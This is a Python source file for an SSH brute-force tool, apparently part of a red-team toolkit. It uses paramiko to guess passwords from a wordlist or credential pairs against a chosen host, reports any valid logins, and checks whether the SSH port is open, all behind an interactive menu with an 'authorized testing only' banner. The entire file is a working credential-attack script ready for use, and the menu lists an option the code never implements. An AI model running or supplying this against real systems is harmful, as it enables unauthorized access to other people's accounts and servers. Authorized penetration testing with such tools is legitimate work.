#!/usr/bin/env python3
"""
Red Team Tools - SSH Bruteforce
Multi-threaded SSH credential testing
For authorized security testing only
"""

import sys
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional
from queue import Queue

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False


class SSHBruteforce:
    """Multi-threaded SSH bruteforce tool"""
    
    def __init__(self, target: str, port: int = 22, timeout: float = 5.0, 
                 max_threads: int = 5, delay: float = 0.5):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.max_threads = max_threads
        self.delay = delay  # Delay between attempts to avoid lockouts
        self.found_credentials: List[Tuple[str, str]] = []
        self.attempts = 0
        self.stop_flag = False
        self.lock = threading.Lock()
    
    def test_credential(self, username: str, password: str) -> bool:
        """Test a single credential pair"""
        if self.stop_flag:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                self.target, port=self.port,
                username=username, password=password,
                timeout=self.timeout,
                allow_agent=False, look_for_keys=False
            )
            
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False
        finally:
            with self.lock:
                self.attempts += 1
            time.sleep(self.delay)
    
    def bruteforce_wordlist(self, username: str, wordlist_path: str, 
                            stop_on_success: bool = True) -> List[str]:
        """Bruteforce with password wordlist"""
        if not os.path.exists(wordlist_path):
            error(f"Wordlist not found: {wordlist_path}")
            return []
        
        with open(wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        info(f"Testing {len(passwords)} passwords for user '{username}'")
        found = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {}
            for password in passwords:
                if self.stop_flag:
                    break
                future = executor.submit(self.test_credential, username, password)
                futures[future] = password
            
            for i, future in enumerate(as_completed(futures)):
                password = futures[future]
                progress_bar(i + 1, len(passwords), f"  Testing")
                
                try:
                    if future.result():
                        found.append(password)
                        self.found_credentials.append((username, password))
                        print()
                        success(f"FOUND: {username}:{password}")
                        
                        if stop_on_success:
                            self.stop_flag = True
                            break
                except:
                    pass
        
        print()
        return found
    
    def bruteforce_credentials(self, credentials: List[Tuple[str, str]],
                               stop_on_success: bool = True) -> List[Tuple[str, str]]:
        """Test list of username:password pairs"""
        info(f"Testing {len(credentials)} credential pairs")
        found = []
        
        for i, (username, password) in enumerate(credentials):
            if self.stop_flag:
                break
            
            progress_bar(i + 1, len(credentials), f"  Testing")
            
            if self.test_credential(username, password):
                found.append((username, password))
                self.found_credentials.append((username, password))
                print()
                success(f"FOUND: {username}:{password}")
                
                if stop_on_success:
                    break
        
        print()
        return found
    
    def check_connection(self) -> bool:
        """Check if SSH port is open"""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0
        except:
            return False


def interactive_mode():
    """Interactive mode for SSH bruteforce"""
    clear_screen()
    print_banner("SSH BRUTE", font="small", color="red")
    
    print(f"{R}{'═' * 50}{RESET}")
    print(f"{Y}⚠  AUTHORIZED TESTING ONLY - Ensure you have permission!{RESET}")
    print(f"{R}{'═' * 50}{RESET}\n")
    
    if not PARAMIKO_AVAILABLE:
        error("paramiko not installed! Run: pip install paramiko")
        input(f"\n{C}Press Enter...{RESET}")
        return
    
    while True:
        print(f"\n{C}OPTIONS{RESET}")
        print(f"  {Y}[1]{RESET} Bruteforce with Wordlist")
        print(f"  {Y}[2]{RESET} Test Credential List")
        print(f"  {Y}[3]{RESET} Test Single Credential")
        print(f"  {Y}[4]{RESET} Check SSH Port")
        print(f"  {R}[0]{RESET} Back")
        
        choice = prompt("Select").strip()
        
        if choice == "0":
            break
        
        elif choice == "1":
            target = prompt("Target IP/hostname").strip()
            port = int(prompt("Port [22]").strip() or "22")
            username = prompt("Username").strip()
            wordlist = prompt("Wordlist path").strip().strip('"')
            
            if not all([target, username, wordlist]):
                error("All fields required")
                continue
            
            brute = SSHBruteforce(target, port)
            
            if not brute.check_connection():
                error(f"Cannot connect to {target}:{port}")
                continue
            
            info(f"Starting bruteforce on {target}:{port}")
            found = brute.bruteforce_wordlist(username, wordlist)
            
            if found:
                success(f"Found {len(found)} valid password(s)")
            else:
                warning("No valid credentials found")
        
        elif choice == "3":
            target = prompt("Target").strip()
            port = int(prompt("Port [22]").strip() or "22")
            username = prompt("Username").strip()
            password = prompt("Password").strip()
            
            brute = SSHBruteforce(target, port)
            if brute.test_credential(username, password):
                success("Authentication successful!")
            else:
                error("Authentication failed")
        
        elif choice == "4":
            target = prompt("Target").strip()
            port = int(prompt("Port [22]").strip() or "22")
            
            brute = SSHBruteforce(target, port)
            if brute.check_connection():
                success(f"SSH port {port} is open")
            else:
                error(f"SSH port {port} is closed/filtered")
    
    input(f"\n{C}Press Enter...{RESET}")


if __name__ == "__main__":
    interactive_mode()
